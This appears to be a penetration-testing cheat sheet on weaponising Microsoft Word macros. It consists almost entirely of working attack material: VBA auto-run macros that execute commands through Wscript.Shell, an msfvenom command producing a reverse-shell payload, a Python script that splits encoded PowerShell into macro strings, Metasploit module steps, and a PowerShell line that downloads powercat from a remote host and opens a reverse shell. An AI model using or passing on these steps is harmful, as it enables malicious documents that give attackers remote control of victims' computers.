## Macros
### Manual Method

```
Open Word Document → View → Macros → Macro Name: MyMacro → Macros in: Document(1) → Create
Save it in only .docm or .doc format .docx is not supported.

# Paste this Snippet in Macro.
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String

    CreateObject("Wscript.Shell").Run Str
End Sub
# Save as Word 97-2003 Document Template
```

One more step is having Split Powershell one-liner for the reverse shell, so we have 3 step process:

```
1) msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<port> -f hta-psh -o evil.hta
# read evil.hta and copy the powershell.exe string 

2) Put the Powershell script in a Python code below for splitting
str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC....."

n = 50

for i in range(0, len(str), n):
	print "Str = Str + " + '"' + str[i:i+n] + '"'

3) Copy the split and paste it in Macro (below Dim str and above CreateObject)
```

### Metasploit

1. Follow the First 4 Steps with the below's reference: [https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/multi/fileformat/office_word_macro.md](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/multi/fileformat/office_word_macro.md)
2. got the doc.m file? convert it to a doc
		Usuall, Word files containing macros use the .docm extension. However, it's possible to rename the file by changing the file extension and still keep their macro executing capabilities.
    
3. Upload the doc file to the attacker’s FTP or somewhere with the payload

```
use exploit/multi/fileformat/office_word_macro
set payload windows/shell_reverse_tcp
set lhost and lport
Open a listener and pop up a reverse shell.
```


### Macro Example

```
If possible do a powershell reverse shell base 64 encoded:

IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell


A for-loop iterates over the PowerShell command and prints each chunk in the correct format for our macro. 

str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..." n = 50 
for i in range(0, len(str), n): 
	print("Str = Str + " + '"' + str[i:i+n] + '"')

Sub AutoOpen() 
	MyMacro 
End Sub 
Sub Document_Open() 
	MyMacro 
End Sub 
Sub MyMacro() 
	Dim Str As String 
	Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU" 
	Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd" 
	Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB" ... 
	Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA" 
	Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA" 
	Str = Str + "A== " 
	CreateObject("Wscript.Shell").Run Str 
End Sub
```